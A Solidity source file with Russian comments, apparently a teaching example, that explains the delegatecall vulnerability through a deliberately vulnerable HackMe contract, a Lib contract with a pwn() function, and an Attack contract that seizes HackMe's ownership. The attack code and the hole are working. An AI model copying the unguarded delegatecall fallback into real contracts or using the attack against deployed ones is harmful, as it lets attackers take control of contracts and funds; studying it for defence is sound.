/*
делегировать вызов
Уязвимость
делегат вызов сложен в использовании и неправильное использование 
или неправильное понимание может привести к разрушительным результатам.

Вы должны помнить о двух вещах при использовании делегата

1 делегат вызов сохраняет контекст (хранилище, вызывающая сторона и т. д.)
2 макет хранилища должен быть одинаковым для контракта, 
вызывающего delegatecall, и для вызываемого контракта.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
HackMe — это контракт, в котором для выполнения кода используется вызов делегата.
Не очевидно, что владелец HackMe может быть изменен, поскольку нет
функцию внутри HackMe, чтобы сделать это. Однако злоумышленник может захватить
контракт, используя delegatecall. Посмотрим, как.

1. Алиса развертывает Lib
2. Алиса развертывает HackMe с адресом Lib
3. Ева разворачивает Атаку с адресом HackMe
4. Ева вызывает Attack.attack()
5. Attack теперь является владельцем HackMe

Что случилось?
Ева вызвала Attack.attack().
Атака вызвала резервную функцию HackMe, отправив функцию
селектор pwn(). HackMe перенаправляет вызов в Lib, используя delegatecall.
Здесь msg.data содержит селектор функции pwn().
Это говорит Solidity вызвать функцию pwn() внутри Lib.
Функция pwn() обновляет владельца до msg.sender.
Delegatecall запускает код Lib, используя контекст HackMe.
Поэтому хранилище HackMe было обновлено до msg.sender, где msg.sender — это
вызывающая сторона HackMe, в данном случае Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
